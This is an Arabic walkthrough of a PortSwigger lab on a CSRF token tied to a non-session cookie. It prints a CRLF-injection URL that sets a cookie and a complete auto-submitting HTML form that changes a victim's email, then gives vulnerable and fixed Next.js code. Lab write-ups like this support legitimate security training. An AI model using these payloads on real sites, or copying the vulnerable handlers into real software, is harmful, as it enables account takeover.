# Lab: CSRF where token is tied to non-session cookie

> **Category:** CSRF  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة CSRF في وظيفة تغيير البريد الإلكتروني. الموقع يربط CSRF Token بـ **كوكي غير مربوط بالجلسة** (non-session cookie). يمكننا حقن هذه الكوكي في متصفح الضحية باستخدام ثغرة **CRLF Injection** في وظيفة البحث، ثم تنفيذ هجوم CSRF.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: تسجيل الدخول وفهم آلية التحقق

لدينا حسابان:
- `wiener:peter`
- `carlos:montoya`

**سجل الدخول بحساب wiener.**

عند تغيير البريد، يظهر طلب مثل هذا:

```http
POST /my-account/change-email HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=SESSION_WIENER; csrfKey=CSRF_KEY_WIENER
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=TOKEN_WIENER
```

**الملاحظة:** التوكن (`csrf`) مربوط بكوكي `csrfKey` وليس بالجلسة.

### الخطوة 2: اختبار عدم ارتباط التوكن بالجلسة

**في Burp Repeater:**

1. **غير قيمة `session` كوكي** (ضع قيمة عشوائية)  
   → ستسجل خروج ✅ (الطلب يرفض)

2. **غير قيمة `csrfKey` كوكي** (ضع قيمة عشوائية)  
   → يتم رفض التوكن ❌ (الطلب يرفض)

3. **غير `csrfKey` و `csrf` معاً** بقيم صحيحة من حساب آخر  
   → الطلب ينجح! ✅

هذا يعني أن `csrfKey` هو المهم للتحقق، وغير مربوط بالجلسة.

### الخطوة 3: أخذ csrfKey و csrf من حساب wiener

أرسل طلب تغيير بريد من حساب wiener وسجل:
- `csrfKey=WIENER_CSRF_KEY`
- `csrf=WIENER_TOKEN`

### الخطوة 4: اختبار نقل التوكن إلى حساب carlos

- افتح نافذة خاصة (Incognito/Private)
- سجل الدخول بـ `carlos:montoya`
- في Repeater، استبدل:
  - كوكي `csrfKey` بقيمة wiener
  - معامل `csrf` بقيمة wiener
- الطلب ينجح! ✅ يعني التوكن يعمل عبر الحسابات.

### الخطوة 5: اكتشاف ثغرة CRLF Injection في البحث

**في المتصفح الأصلي (wiener):**

جرب البحث عن أي كلمة، ولاحظ أن الرد يحتوي على:

```http
GET /?search=test HTTP/1.1
```

الرد يحتوي على:
```
Set-Cookie: search=test; SameSite=None
```

**نستغل هذا لحقن كوكي `csrfKey`:**  
لأن المدخلات تنعكس في `Set-Cookie` بدون تنقية.

### الخطوة 6: إنشاء رابط لحقن الكوكي

```
https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=WIENER_CSRF_KEY%3b%20SameSite=None
```

**ماذا يفعل هذا الرابط؟**
- `%0d%0a` =回车换行 (CRLF) - ينشئ سطراً جديداً في الهيدرات
- نضيف `Set-Cookie: csrfKey=WIENER_CSRF_KEY`
- المتصفح سيضبط الكوكي `csrfKey` بالقيمة التي نريدها

### الخطوة 7: إنشاء HTML للهجوم

سنقوم بـ:
1. حقن كوكي `csrfKey` في متصفح الضحية (باستخدام CRLF Injection)
2. ثم تنفيذ طلب تغيير البريد باستخدام التوكن المناسب

```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=WIENER_CSRF_KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">

<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="carlos%40attacker.net">
    <input type="hidden" name="csrf" value="WIENER_TOKEN">
</form>

<script>
    // الصورة تحاول التحميل، تفشل (onerror) ثم يتم إرسال الفورم
</script>
```

### الخطوة 8: رفع الهجوم إلى Exploit Server

- اضغط **Go to exploit server**
- في حقل **Body**، الصق الـ HTML أعلاه
- اضغط **Store**

### الخطوة 9: تجربة الهجوم على نفسك

- اضغط **View exploit**
- انتظر ثانية
- ارجع إلى حسابك → هل تغير بريدك الإلكتروني؟

**ملاحظة:** قد لا يعمل على نفسك لأن الكوكي موجود أصلاً. المهم أن يعمل على الضحية.

### الخطوة 10: تسليم الهجوم للضحية

- غير البريد الإلكتروني إلى قيمة مختلفة (مثل `victim@hacked.net`)
- اضغط **Store**
- اضغط **Deliver to victim**

### الخطوة 11: حل المختبر

بمجرد تسليم الهجوم، سيتم حل المختبر تلقائياً ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هي non-session cookie؟** | كوكي غير مربوط بجلسة المستخدم (مثل `csrfKey`) |
| **كيف حقنّا الكوكي؟** | باستخدام ثغرة CRLF Injection في وظيفة البحث |
| **لماذا استخدمنا `onerror`؟** | الصورة تحاول التحميل، تفشل ثم ت send الفورم |
| **ماذا يفعل `%0d%0a`؟** | سطر جديد (CRLF) يسمح بحقن هيدرات جديدة |
| **لماذا `SameSite=None`؟** | لتسمح الكوكي بالارسال في الطلبات عبر المواقع |

---

## 📊 ملخص آلية الهجوم

| الخطوة | ما يحدث |
|--------|---------|
| 1 | الضحية يزور صفحتنا |
| 2 | الصورة تحاول التحميل → تسبب CRLF Injection → تحقن كوكي `csrfKey` |
| 3 | الفورم يرسل تلقائياً (بسبب `onerror`) |
| 4 | الخادم يقارن `csrf` في الـ Body مع `csrfKey` في الكوكي → يطابقان ✅ |
| 5 | يتم تغيير البريد الإلكتروني للضحية |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

1. CSRF Token مربوط بكوكي غير مربوط بالجلسة
2. وجود ثغرة **CRLF Injection** في وظيفة البحث تسمح بحقن كوكي

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// وظيفة البحث - فيها CRLF Injection
export default function searchHandler(req, res) {
  const { search } = req.query;
  // خطير: يعكس المدخلات مباشرة في Set-Cookie
  res.setHeader('Set-Cookie', `search=${search}; SameSite=None`);
  res.send(`Search results for: ${search}`);
}

// وظيفة تغيير البريد - CSRF token مربوط بـ csrfKey cookie
export default function emailHandler(req, res) {
  const { email, csrf } = req.body;
  const { sessionId, csrfKey } = req.cookies;
  
  // خطأ: يتحقق أن csrf يطابق csrfKey فقط
  if (getCsrfToken(csrfKey) !== csrf) {
    return res.status(403).send('Invalid CSRF token');
  }
  
  const user = getUserBySession(sessionId);
  updateUserEmail(user.id, email);
  res.send('Email updated');
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// وظيفة البحث - إصلاح CRLF Injection
export default function searchHandler(req, res) {
  let { search } = req.query;
  
  // إزالة أي أحرف خطيرة مثل CRLF
  search = search.replace(/[\r\n]/g, '');
  
  // استخدام encoding آمن
  const safeSearch = encodeURIComponent(search);
  res.setHeader('Set-Cookie', `search=${safeSearch}; SameSite=None`);
  res.send(`Search results for: ${escapeHtml(search)}`);
}

// وظيفة تغيير البريد - إصلاح: ربط التوكن بالجلسة
const sessionTokens = new Map(); // sessionId -> token

export default function emailHandler(req, res) {
  const { email, csrf } = req.body;
  const { sessionId } = req.cookies;
  
  // التحقق من أن التوكن يخص هذه الجلسة
  const expectedToken = sessionTokens.get(sessionId);
  if (!expectedToken || expectedToken !== csrf) {
    return res.status(403).send('Invalid CSRF token');
  }
  
  sessionTokens.delete(sessionId); // single-use
  
  const user = getUserBySession(sessionId);
  updateUserEmail(user.id, email);
  res.send('Email updated');
}
```

**الخلاصة:** 
1. لا تثق في كوكي غير مربوط بالجلسة للتحقق من CSRF
2. امنع CRLF Injection في أي مكان يعكس مدخلات المستخدم

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **ربط التوكن بالجلسة:** استخدم `sessionId` لتخزين التوكن.
2. **منع CRLF Injection:** ارفض أو قم بتشفير `\r` و `\n` في أي مدخل.
3. **استخدام `HttpOnly` للكوكيز:** لمنع سرقتها عبر XSS (رغم أنها لا تمنع CSRF).
4. **استخدام SameSite=Lax أو Strict:** كطبقة دفاع إضافية.

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)
- [CSRF Cheat Sheet](https://portswigger.net/web-security/csrf)
- [CRLF Injection](https://portswigger.net/web-security/crlf-injection)
